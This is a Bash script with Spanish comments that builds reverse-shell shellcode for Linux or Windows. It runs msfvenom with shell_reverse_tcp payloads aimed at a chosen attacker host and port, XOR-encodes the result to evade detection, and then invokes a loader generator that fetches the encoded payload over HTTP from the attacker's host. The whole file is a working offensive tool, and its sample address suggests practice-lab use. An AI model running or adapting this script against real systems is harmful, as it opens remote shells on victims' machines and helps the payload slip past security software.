#!/bin/bash

# gen_text.sh - Script paramétrico para generar shellcode (Linux/Windows) con configuración personalizable
# Uso: ./gen_txt.sh <OS> <LHOST> [LPORT] [OUTPUT_BIN] [OUTPUT_ENC]
# Ejemplo: ./gen_txt.sh linux 10.10.14.11 5555 shell.bin shellcode_test.txt



# Valores por defecto
LPORT_DEFAULT="5555"
OUTPUT_BIN_DEFAULT="shell.bin"
OUTPUT_ENC_DEFAULT="shellcode_test2.txt"

# Validar al menos los dos primeros argumentos: OS y LHOST
if [ $# -lt 2 ]; then
    echo "Uso: $0 <OS> <LHOST> [LPORT] [OUTPUT_BIN] [OUTPUT_ENC]"
    echo "Ej:  $0 linux 10.10.14.11"
    echo "Ej:  $0 windows 10.10.14.11 4444 win_shell.bin win_shell_encoded.txt"
    exit 1
fi

# Asignar argumentos
OS="$1"
LHOST="$2"
LPORT="${3:-$LPORT_DEFAULT}"
OUTPUT_BIN="${4:-$OUTPUT_BIN_DEFAULT}"
OUTPUT_ENC="${5:-$OUTPUT_ENC_DEFAULT}"
XOR_KEY=${6:-0x42}

# Elegir payload según el sistema operativo
case "$OS" in
    linux)
        PAYLOAD="linux/x64/shell_reverse_tcp"
        CMD="./gen_loader2.sh --target linux --url \"http://$LHOST/$OUTPUT_ENC_DEFAULT\""
        ;;
    windows)
        PAYLOAD="windows/x64/shell_reverse_tcp"
        CMD="./gen_loader2.sh --target windows --url \"http://$LHOST/$OUTPUT_ENC_DEFAULT\""
        ;;
    *)
        echo "Error: OS no válido. Usa 'linux' o 'windows'."
        exit 1
        ;;
esac

echo "[*] Configuración:"
echo "    OS        = $OS"
echo "    LHOST     = $LHOST"
echo "    LPORT     = $LPORT"
echo "    OUTPUT_BIN  = $OUTPUT_BIN"
echo "    OUTPUT_ENC  = $OUTPUT_ENC"

# Generar shellcode
echo "[*] Generando shellcode..."
msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f raw -o "$OUTPUT_BIN" || {
    echo "[!] Error al generar shellcode con msfvenom."
    exit 1
}

# Aplicar XOR encoding
echo "[*] Codificando con XOR usando gen_xor.sh..."
./gen_xor.sh "$OUTPUT_BIN" "$XOR_KEY" > "$OUTPUT_ENC" || {
    echo "[!] Error al ejecutar gen_xor.sh (asegúrate de que exista y sea ejecutable)."
    exit 1
}

# Mostrar los primeros bytes del resultado
echo "[*] Primeros bytes del shellcode codificado:"
head -n1 "$OUTPUT_ENC"

echo "[+] Proceso completado. Shellcode listo en '$OUTPUT_ENC'"
bash -c "$CMD"
